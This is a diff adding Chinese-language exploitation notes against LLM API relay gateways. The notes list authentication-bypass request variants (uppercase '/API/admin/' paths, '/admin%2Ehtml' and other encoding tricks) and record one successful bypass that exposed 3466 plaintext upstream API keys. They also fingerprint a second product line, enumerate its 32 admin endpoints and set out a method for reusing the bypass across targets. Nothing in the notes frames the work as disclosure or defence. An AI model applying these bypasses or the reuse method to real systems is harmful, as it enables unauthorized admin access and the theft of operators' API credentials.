@@ -1,0 +1,53 @@
+## 一、绕过验证清单（要试的变体）
+
+对照组（必须先是 401，否则说明压根没鉴权，更直接）：
+  GET /api/admin/channel-types          → 401
+绕过组：
+  GET /API/admin/channel-types          → 13030 上 200
+  GET /API/admin/channels               → 13030 上 200，105 渠道 / 3466 明文上游密钥
+  GET /API/admin/stats | settings | generations | request-logs
+  GET /admin.html                       → 302 跳登录
+  GET /admin%2Ehtml                     → 13030 上 200，完整管理前端
+  GET /admin%2ehtml | /admin.htm%6c | /admin.html%00 | //admin.html | /./admin.html
+  GET /Api/admin/* | /aPI/admin/* | /API/ADMIN/*
+路径归一化：%20 后缀、/..;/、//、/%61dmin/、/./  —— 落到 302 兜底即未命中，非绕过。
+方法变换：HEAD / OPTIONS / 尾斜杠。
+
+## 二、判定表（实测证据）
+
+| 目标 | 产品 | /API/ 大小写绕过 | /admin%2Ehtml | 上游密钥 |
+|---|---|---|---|---|
+| 203.0.113.105:13030 | LLM 管理中心 | **成立**（200） | **成立**（200，管理前端） | **3466 条明文（3171 OpenRouter）** |
+| example.com / okapi.example.com / target6.example.com（203.0.113.104） | AIRouter | **不成立**（401） | 200 但仅前端壳，接口 401 | 未取到 |
+| okapi-good.example.org / okapi-good.example.com（203.0.113.29） | AIRouter | **不成立**（401） | 同上 | 未取到 |
+| target7.example.com（203.0.113.96） | AIRouter | **不成立**（401） | 同上 | 未取到 |
+
+## 三、AIRouter 产品结构指纹（用于识别"非 13030 同款"）
+
+- 响应头：`Server: openresty` + `X-Powered-By: Express` + helmet 全套安全头
+  （Cross-Origin-Opener-Policy / Cross-Origin-Resource-Policy / Origin-Agent-Cluster /
+   Referrer-Policy: no-referrer / Strict-Transport-Security / X-Content-Type-Options: nosniff /
+   X-DNS-Prefetch-Control: off / X-Download-Options: noopen / X-Frame-Options: SAMEORIGIN /
+   X-Permitted-Cross-Domain-Policies: none / X-XSS-Protection: 0 / Vary: Origin, Accept-Encoding /
+   Access-Control-Allow-Credentials: true）
+- 前端：根路径 `styles.css` / `admin-styles.css` / `example.com` / `common.js`；
+  `<title>Admin - AIRouter</title>`；版本参数 `?v=20260802-toolpage-refine`、
+  `example.com?v=20260924-forbidden-keys`
+- **不存在**（与 13030 的关键差异）：`/login.html`、`/assets/pages/*.js`、`/api/admin/channel-types`
+- 唯一未授权读点：`GET /api/config`（白标品牌配置）+ 静态 `/admin.html`（管理前端壳）
+- 管理接口清单（32 个，全需 `Authorization: Bearer`，token 由 `POST /api/admin/auth` 下发并
+  存于 sessionStorage）：
+  `/api/admin/{auth,models,system,logs,renewals,users,sensitive-config}`、
+  `/api/admin/apikeys{/generate,/import,/reload,/add-days,/replace-tagged,/replace-tagged/preview}`、
+  `/api/admin/forbidden-keys{/check,/forbid,/reload,/unforbid}`、
+  `/api/admin/ip-blacklist{/add,/reload,/remove}`、`/api/admin/whitelist{/add,/remove}`、
+  `/api/admin/compensation{/create,/execute,/list,/detail,/search}`、
+  `/api/admin/order-logs{/recent,/transaction/}`
+- `GET /api/admin/sensitive-config?reveal=1` 是最有诱惑力的读点（reveal 开关），但未授权一律 401。
+
+## 四、结论
+
+**"同运营方 / 同类型中转站 ⇒ 同一份自研代码 ⇒ 同一绕过"这个推断在本例被证伪**：
+13030 是 Node 自研"LLM 管理中心"（中间件用大小写敏感未解码 `req.path`，Express 路由
+`caseSensitive:false` 且先解码 → 判定不一致）；AIRouter 系列 6 台是该运营方另一条产品线
+（白标包月网关），鉴权中间件实现正确。跨目标复用绕过前，必须先跑第一节的对照组。
